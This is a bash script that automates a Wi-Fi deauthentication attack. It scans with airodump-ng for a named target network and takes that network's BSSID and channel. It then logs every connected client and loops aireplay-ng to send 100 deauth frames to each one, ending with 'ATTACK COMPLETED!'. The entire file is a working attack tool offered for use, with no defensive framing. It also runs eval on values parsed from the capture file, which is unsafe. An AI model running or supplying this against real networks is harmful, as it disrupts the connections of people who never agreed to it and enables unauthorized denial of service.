#! /bin/bash

#IMPORTANT VARIABLE DECLARATIONS
WLAN="wlan0"
SKIP_SCAN=0
TARGET_BSSID=0
TARGET_CHANNEL=0
COUNTER=0


#Flag handler
while getopts "b:c:hi:st:" opt; do
	case $opt in
		b)
			TARGET_BSSID=$OPTARG
			;; 
		c)
			TARGET_CHANNEL=$OPTARG
			;;
		h)
			cat manual.txt
			exit
			;;
		i) 
			WLAN=$OPTARG
			;;
		s)
			echo "Skipping automatic scanning..."
			SKIP_SCAN=1
			;;
		t) 
			TARGET=$OPTARG
			;;
	esac
done
#Sanity check
echo "Interface set as: $WLAN"
echo "Target wifi set as: $TARGET"

if [ $SKIP_SCAN -eq 0 ]; then
	#Clear previous runs
	rm -f runfiles/initscan-01.csv

	#Log initial BSSIDs
	mkdir -p runfiles
	gnome-terminal -e "bash -c \"airodump-ng -w runfiles/initscan --output-format csv $WLAN; exec bash\"" &> /dev/null
	sleep 15
	kill $(ps aux | grep 'airodump-ng' | awk '{print $2}') &> /dev/null

	#Search BSSIDs for target
	MATCHING_LINES=$(grep $TARGET runfiles/initscan-01.csv)

	#Check the number of matching networks and act accordingly
	if [ $(grep $TARGET runfiles/initscan-01.csv | wc -l) -eq 0 ]; then
		echo "ERROR: no matches."
		exit
	elif [ $(grep $TARGET runfiles/initscan-01.csv | wc -l) -ne 0 ]; then
		echo "WARNING: more than one match. Attacking first match."
		TEMP_MATCHING_LINES=$(echo $MATCHING_LINES | head -n 1)
		MATCHING_LINES=$TEMP_MATCHING_LINES
	else
		echo "Correct amount of matches."
	fi

	#Gotta trim the BSSID and channel or commas will screw with everything
	UNTRIMMED_TARGET_BSSID=$(echo $MATCHING_LINES | awk '{print $1;}')
	TARGET_BSSID=${UNTRIMMED_TARGET_BSSID::-1}
	UNTRIMMED_TARGET_CHANNEL=$(echo $MATCHING_LINES | awk '{print $6;}')
	TARGET_CHANNEL=${UNTRIMMED_TARGET_CHANNEL::-1}
	echo "The target is associated with $TARGET_BSSID and was found on channel $TARGET_CHANNEL."
else
	if [ $TARGET_BSSID -eq 0 ] || [ $TARGET_CHANNEL -eq 0 ] ; then
		echo "Incorrect arguments"
		exit
	fi
fi

#Log specific clients on wifi network
rm -f runfiles/specificscan-01.csv
gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w runfiles/specificscan --output-format csv $WLAN; exec bash\"" &> /dev/null
sleep 25
kill $(ps aux | grep 'airodump-ng' | awk '{print $2}') &> /dev/null

#Open new terminal to capture channel. 
gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID $WLAN; exec bash\"" &> /dev/null

sleep 1

#Loop through text file and deauth all targets
while read line; do
	#Ignore first 5 lines of input
	#Tried to use tail but resulted in ambiguous redirect :/
	if [ $COUNTER -lt 5 ]; then
		COUNTER=$((COUNTER+1))
	else
		UNTRIMMED_TARGET=$(echo $line | awk '{print $1;}')
		TARGET_ID=${UNTRIMMED_TARGET::-1}
		if [ -z $TARGET_ID ]; then
			echo "ATTACK COMPLETED! :) :) :)"
			kill $(ps aux | grep 'airodump-ng' | awk '{print $2}') &> /dev/null
			exit
		fi
		echo "KICKING: $TARGET_ID off of $TARGET_BSSID"
		eval aireplay-ng -a $TARGET_BSSID --deauth 100 -c $TARGET_ID $WLAN
	fi
done < runfiles/specificscan-01.csv
